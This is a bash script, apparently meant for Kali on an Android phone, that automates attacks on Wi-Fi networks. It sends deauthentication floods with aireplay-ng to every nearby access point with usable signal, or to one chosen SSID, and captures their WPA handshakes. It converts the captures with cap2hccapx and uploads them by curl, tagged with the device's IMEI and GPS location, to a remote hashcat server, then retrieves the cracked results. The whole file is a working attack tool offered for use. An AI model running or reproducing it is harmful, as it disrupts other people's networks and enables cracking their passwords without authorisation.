#!/bin/bash

interface=""
serverAddr=""

checkUtils(){
        printf "Check utilities\n"
        
        #airmon-ng
        output=$(airmon-ng)
        if [[ "$output" == *"PHY"* ]]; then

                printf "airmon-ng....\033[32m Done\033[0m\n"
        else
                printf "airmon-ng....\033[31mFail\033[0m\n"
                exit 1
        fi

        #airodump-ng
        output=$(airodump-ng)
        if [[ "$output" == *"usage: airodump-ng"* ]]; then
                printf "airodump-ng....\033[32m Done\033[0m\n"
        else
                printf "airodump-ng....\033[31m Fail\033[0m\n"
                exit 1
        fi

        #cap2hccapx
        output=`cap2hccapx 2>&1`
        if [[ "$output" == *"usage: cap2hccapx input.pcap output.hccapx"* ]]; then
                printf "cap2hccapx....\033[32m Done\033[0m\n"
        else
                printf "cap2hccapx....\033[31m Fail\033[0m\n"
                exit 1
        fi

        printf "\n"
}


checkServer(){
        curl http://$serverAddr/handshakes &> /dev/null
        if [[ $? == 0 ]]; then
                printf "Server status - \033[32mworking \033[0m\n"
        else
                printf "Server status - \033[31mnot working\033[0m\n"
                serverAddr=""
                exit 1
        fi
}

sendHandshake() {
        trap 'cleanup' EXIT
    
        long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $16}')
        echo "Long: "$long
        lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
        echo "Lat: "$lat
        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
        echo "IMEI: "$imei
        echo $1
        curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $1" -H "Content-Type: multipart/form-data" -F "file=@./shakes/$1" http://$serverAddr/task
        if [[ $? == 0 ]]; then
                rm ./shakes/$1
        else
                echo "Failed send file $1"
        fi
}

checkHandshakes() {
        trap 'cleanup' EXIT
        printf "\n"
        echo "Check handshakes..."
        cleanout=$(wpaclean /home/kali/hscollector/cleancap.cap /home/kali/hscollector/shakes-01.cap)
        echo $cleanout
        if [[ "$cleanout" == *"Net "* ]]; then
                output=$(cap2hccapx /home/kali/hscollector/cleancap.cap /home/kali/hscollector/cleanshakes.hccapx)
                echo $output
                if [[ "$output" != *"Written 0"* ]]; then
                        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
                        printf "\033[32mHandshakes detected!!!\033[0m\n"
                        time=$(date +%s)
                        filename="shake-$time-$imei"
                        if [[ -d /home/kali/hscollector/shakes ]]; then
                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time-$imei
                        else
                                mkdir /home/kali/hscollector/shakes
                                chmod 777 -R /home/kali/hscollector/shakes
                                mv /home/kali/hscollector/cleanshakes.hccapx /home/kali/hscollector/shakes/shake-$time-$imei
                        fi
                        sendHandshake $filename
                 else
                        printf "\033[31mNo handshakes\033[0m\n"
                        rm /home/kali/hscollector/cleanshakes.hccapx >/dev/null
                 fi
        else 
                printf "\033[31mNo handshakes\033[0m\n"
                rm /home/kali/hscollector/cleanshakes.hccapx >/dev/null
        fi
        rm cleancap.cap > /dev/null
}

airodumpPID=""
passive() {
  trap 'cleanup;getparams' EXIT
  airmon-ng start $interface >/dev/null
  echo "Start airodump.."
  timeout 60 airodump-ng -w /home/kali/hscollector/shakes $interface </dev/null >/dev/null
  checkHandshakes
  rm /home/kali/hscollector/shakes-* > /dev/null
  passive
}

active() {
  trap 'cleanup;' EXIT
  echo "Collect APs..."
  timeout 10 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
  while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
          if [[ $BSSID == "BSSID" ]];then
                  continue
          fi
          if [[ $id == "" ]]
          then
                  continue
          fi
          if [[ $BestQuality -lt -70 ]] || [[ $BestQuality -eq -1 ]]
          then
                  continue
          fi
            
          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
          iwconfig $interface channel $Channel
          aireplay-ng -a $BSSID -0 10 $interface &
          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface >/dev/null 2>&1 </dev/null &
          airodumpPID=`echo $!`
          sleep 30
          kill -9 $airodumpPID
          checkHandshakes
          rm /home/kali/hscollector/shakes-01.* >/dev/null
  done < <(tac /home/kali/hscollector/shakesCollector-01.kismet.csv)
  rm /home/kali/hscollector/shakes* &>/dev/null
  
}

attackSpecific(){
           trap 'cleanup;' EXIT
           airmon-ng start $interface >/dev/null
           printf "Enter SSID: \nEnter: "
           read;
           SSID=${REPLY}
           timeout 20 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
           while IFS=";" read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
                  if [[ $BSSID == "BSSID" ]];then
                          continue
                  fi
                  
                  if [[ $ESSID == $SSID ]]
                  then
                          printf "\033[32mFind this AP\033[0m\n"
                          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
                          iwconfig $interface channel $Channel
                          aireplay-ng -a $BSSID -0 10 $interface &
                          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
                          airodumpPID=`echo $!`
                          sleep 30
                          echo "airodumpPID:"$airodumpPID
                          kill -9 $airodumpPID
                          checkHandshakes
                          rm /home/kali/hscollector/shakes-01.* >/dev/null
                          break
                  else
                        continue
                  fi                 
                  printf "\033[31mNo this AP\033[0m\n"

            done < /home/kali/hscollector/shakesCollector-01.kismet.csv
            rm /home/kali/hscollector/shakes* &>/dev/null
}

getresults(){
        imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
        curl -H "imei: $imei" $serverAddr/progress
        curl -H "imei: $imei" $serverAddr/results
}

getparams(){
        printf "Please select an action:\n"
        printf "1) Start active attack\n2) Start passive attack\n3) Get crack results\n4) Attack a specific point\nEnter: "
        read;
        re='^[0-9]+$'
        if ! [[ ${REPLY} =~ $re ]] || [[ ${REPLY} >4 ]]; then
                printf "Invalid input.\n"
                getparams
        fi
        command=${REPLY}
        if [[ $command == 1 ]] || [[ $command == 2 ]] || [[ $command == 4 ]];then
                if [[ $interface != "" ]] && [[ $serverAddr != "" ]];then
                        if [[ $command == 1 ]];then
                                active
                                getparams
                        fi
                        if [[ $command == 2 ]];then
                                passive
                                
                        fi
                        if [[ $command == 4 ]]
                        then
                                attackSpecific
                                getparams
                        fi
                else
                        printf "Please set the wireless interface(e.g. wlan0):\nEnter: "
                        read;
                        interface=${REPLY}
                        output=$(airmon-ng start $interface)
                        if [[ "$output" == *"monitor mode vif enabled for"* ]] || [[ "$output" == *"monitor mode already enabled"* ]]; then
                                printf "Monitor mode on $interface \033[32m....Enabled\033[0m\n"
                        else
                                printf "Monitor mode failed enable on $interface\033[31m ....Fail\033[0m\n"
                                interface=""
                                getparams
                        fi

                        printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\nEnter: "
                        read;
                        serverAddr=${REPLY}
                        checkServer
                        if [[ $command == 1 ]];then
                                active
                                getparams
                        fi
                        if [[ $command == 2 ]];then
                                passive
                                
                        fi
                        if [[ $command == 4 ]]
                        then
                                attackSpecific
                                getparams
                        fi
                fi

        else if [[ ${REPLY} == 3 ]];then
                if [[ $serverAddr != "" ]];then                  
                        getresults

                else
                        printf "Please set the hashcat server address(e.g. 192.168.1.24:9000)\nEnter: "
                        read;
                        serverAddr=${REPLY}
                        checkServer
                        getresults
                fi
                getparams

        fi
        fi

}

cleanup(){
        kill -9 $airodumpPID
        rm cleancap.cap

        rm /home/kali/hscollector/shakes* &> /dev/null
        rm /home/kali/hscollector/cleanshakes.hccapx &> /dev/null
}

trap 'cleanup;exit 0' SIGINT SIGTERM ERR EXIT

if [[ "$(whoami)" != root ]]; then
  echo "Only user root can run this script."
  exit 1
fi

main(){
        checkUtils
        chroot /proc/1/cwd/ settings put secure location_mode 3
        getparams
        cleanup
}




if [[ $1 != "" ]] && [[ $2 != "" ]] && [[ $3 != "" ]];then
                chroot /proc/1/cwd/ settings put secure location_mode 3
                interface=$2
                serverAddr=$3
                checkUtils
                airmon-ng start $interface >/dev/null

                if [[ $1 == "a" ]];then
                        checkServer
                        active
                fi
                if [[ $1 == "p" ]];then
                        checkServer
                        passive

                fi
                if [[ $1 == "s" ]];then
                        checkServer
                        attackSpecific
                fi
                if [[ $1 == "r" ]];then
                        getresults
                fi
                exit 0

fi
main 

